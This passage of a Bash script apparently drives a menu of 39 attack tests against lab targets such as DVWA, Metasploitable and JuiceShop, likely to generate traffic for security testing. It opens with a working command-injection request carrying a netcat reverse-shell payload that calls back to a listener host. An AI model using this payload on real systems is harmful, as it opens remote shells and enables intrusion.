        curl -i -s -k -X 'POST' \
            -b "PHPSESSID=$SESSID; security=low" \
            --data-binary "ip=%3Brm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20$LHOST%204444%20%3E%2Ftmp%2Ff&Submit=Submit" \
            "http://$DVWA_IP/DVWA/vulnerabilities/exec/"
    else
        nc -lvp 4444 &
        sleep 1
        curl -i -s -k -X 'POST' \
            -b "PHPSESSID=$SESSID; security=low" \
            --data-binary "ip=%3Brm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20$LHOST%204444%20%3E%2Ftmp%2Ff&Submit=Submit" \
            "http://$DVWA_IP/DVWA/vulnerabilities/exec/"
    fi
}


# Function to show help
show_help() {
    echo "Usage: $0 [options]"
    echo
    echo "Options:"
    echo "  --help                      Show this help message and list of tests."
    echo "  --capture                   Enable traffic capture (disabled by default)."
    echo "  --lhost <IP_ADDRESS>        Specify the local host IP address for reverse shells (default: $LHOST)."
    echo "  --juiceshop_ip <IP>         Specify the JuiceShop IP address."
    echo "  --metasploitable_ip <IP>    Specify the Metasploitable IP address."
    echo "  --dvwa_ip <IP>              Specify the DVWA IP address."
    echo "  --sessid <SESSID>           Specify the PHPSESSID for DVWA."
    echo "  --timeout <seconds>         Specify the timeout in seconds (default: $TIMEOUT)."
    echo "  --scan_delay <seconds>      Specify the scan delay in seconds (default: $SCAN_DELAY)."
    echo "  --interface <name>          Specify the network interface (default: $INTERFACE)."
    echo "  --scripts <numbers>         Execute specified tests (e.g., --scripts 1,3,5)."
    echo "  --all                       Execute all tests."
    echo "  --exclude <numbers>         Exclude specified tests when using --all (e.g., --exclude 2,4)."
    echo
    echo "Available tests:"
    echo "1.  Metasploitable nmap vulnerability scan"
    echo "2.  Metasploitable nmap Service and Version Detection"
    echo "3.  Metasploitable RCE PROFTPD"
    echo "4.  Metasploitable RCE Distccd"
    echo "5.  Metasploitable RCE IRCd"
    echo "6.  Metasploitable SSH Bruteforcing"
    echo "7.  Metasploitable FTP Bruteforce"
    echo "8.  Metasploitable SMB Bruteforce"
    echo "9.  JuiceShop Webapp Bruteforce"
    echo "10. Metasploitable SQLi Test"
    echo "11. Metasploitable Slowloris DoS"
    echo "12. JuiceShop nmap vulnerability scan"
    echo "13. JuiceShop nmap Service and Version Detection"
    echo "14. JuiceShop Nikto Scan"
    echo "15. JuiceShop Directory Listing"
    echo "16. JuiceShop SQL Injection via Request File"
    echo "17. Metasploitable Webapp Bruteforce (Drupal)"
    echo "18. DVWA nmap vulnerability scan"
    echo "19. DVWA nmap Service and Version Detection"
    echo "20. DVWA nmap UDP scan"
    echo "21. DVWA Webapp Bruteforce (noisy)"
    echo "22. DVWA Webapp Bruteforce (sneaky)"
    echo "23. DVWA LFI scan"
    echo "24. DVWA SQL Injection Test with sqlmap"
    echo "25. DVWA SQL Injection Time-Based (manual)"
    echo "26. DVWA Reflected XSS Payloads"
    echo "27. DVWA Stored XSS"
    echo "28. DVWA Slowloris DoS"
    echo "29. DVWA Nikto Scan"
    echo "30. DVWA Directory Listing"
    echo "31. DVWA Command Injection"
    echo "32. Patator FTP Login Brute Force"
    echo "33. Patator SSH Login Brute Force"
    echo "34. Patator MySQL Login Brute Force"
    echo "35. Patator PostgreSQL Login Brute Force"
    echo "36. Patator VNC Login Brute Force"
    echo "37. GoldenEye DoS Attack"
    echo "38. Heartbleed Exploit Test"
    echo "39. DVWA Netcat Reverse Shell Attempt"
}

# Parse command-line arguments
if [[ $# -eq 0 ]]; then
    show_help
    exit 1
fi

declare -a scripts_to_run
declare -a exclude_tests
run_all=false

while [[ $# -gt 0 ]]; do
    key="$1"
    case $key in
        --help)
            show_help
            exit 0
            ;;
        --all)
            run_all=true
            shift
            ;;
        --capture)
            CAPTURE_ENABLED=true
            shift
            ;;
        --exclude)
            if [[ -n "$2" && ! "$2" =~ ^-- ]]; then
                IFS=',' read -ra exclude_tests <<< "$2"
                shift 2
            else
                echo "Error: --exclude requires a comma-separated list of numbers."
                exit 1
            fi
            ;;
        --scripts)
            if [[ -n "$2" && ! "$2" =~ ^-- ]]; then
                IFS=',' read -ra scripts_to_run <<< "$2"
                shift 2
            else
                echo "Error: --scripts requires a comma-separated list of numbers."
                exit 1
            fi
            ;;
        --lhost)
            if [[ -n "$2" && ! "$2" =~ ^-- ]]; then
                LHOST="$2"
                shift 2
            else
                echo "Error: --lhost requires an IP address."
                exit 1
            fi
            ;;
        --juiceshop_ip)
            if [[ -n "$2" && ! "$2" =~ ^-- ]]; then
                JUICESHOP_IP="$2"
                shift 2
            else
                echo "Error: --juiceshop_ip requires an IP address."
                exit 1
            fi
            ;;
        --metasploitable_ip)
            if [[ -n "$2" && ! "$2" =~ ^-- ]]; then
                METASPLOITABLE_IP="$2"
                shift 2
            else
                echo "Error: --metasploitable_ip requires an IP address."
                exit 1
            fi
            ;;
        --dvwa_ip)
            if [[ -n "$2" && ! "$2" =~ ^-- ]]; then
                DVWA_IP="$2"
                BASE_URL="http://$DVWA_IP/DVWA/"
                shift 2
            else
                echo "Error: --dvwa_ip requires an IP address."
                exit 1
            fi
            ;;
        --sessid)
            if [[ -n "$2" && ! "$2" =~ ^-- ]]; then
                SESSID="$2"
                shift 2
            else
                echo "Error: --sessid requires a session ID."
                exit 1
            fi
            ;;
        --timeout)
            if [[ -n "$2" && ! "$2" =~ ^-- ]]; then
                TIMEOUT="$2"
                shift 2
            else
                echo "Error: --timeout requires a value in seconds."
                exit 1
            fi
            ;;
        --scan_delay)
            if [[ -n "$2" && ! "$2" =~ ^-- ]]; then
                SCAN_DELAY="$2"
                shift 2
            else
                echo "Error: --scan_delay requires a value."
                exit 1
            fi
            ;;
        --interface)
            if [[ -n "$2" && ! "$2" =~ ^-- ]]; then
                INTERFACE="$2"
                shift 2
            else
                echo "Error: --interface requires a value."
                exit 1
            fi
            ;;
        *)
            echo "Unknown option: $1"
            show_help
            exit 1
            ;;
    esac
done

# Execute tests based on the options provided
if [ "$run_all" = true ]; then
    # Build a list of tests to exclude
    declare -A exclude_map
    for num in "${exclude_tests[@]}"; do
        num=$(echo "$num" | tr -d '[:space:]') # Remove any spaces
        if [[ $num =~ ^[0-9]+$ ]] && [ "$num" -ge 1 ] && [ "$num" -le 39 ]; then
            exclude_map[$num]=1
        else
            echo "Invalid test number to exclude: $num"
            exit 1
        fi
    done

    for i in {1..39}; do
        if [[ -z "${exclude_map[$i]}" ]]; then
            echo -e "Init Procedure - $(date "+%Y-%m-%d %H:%M:%S")"
            test${i}
        else
            echo "Skipping Test $i"
        fi
    done
elif [ ${#scripts_to_run[@]} -gt 0 ]; then
    for num in "${scripts_to_run[@]}"; do
        num=$(echo "$num" | tr -d '[:space:]') # Remove any spaces
        if [[ $num =~ ^[0-9]+$ ]] && [ "$num" -ge 1 ] && [ "$num" -le 39 ]; then
            echo -e "Init Procedure - $(date "+%Y-%m-%d %H:%M:%S")"
            test${num}
        else
            echo "Invalid test number: $num"
        fi
    done
else
    echo "No tests specified."
    show_help
    exit 1
fi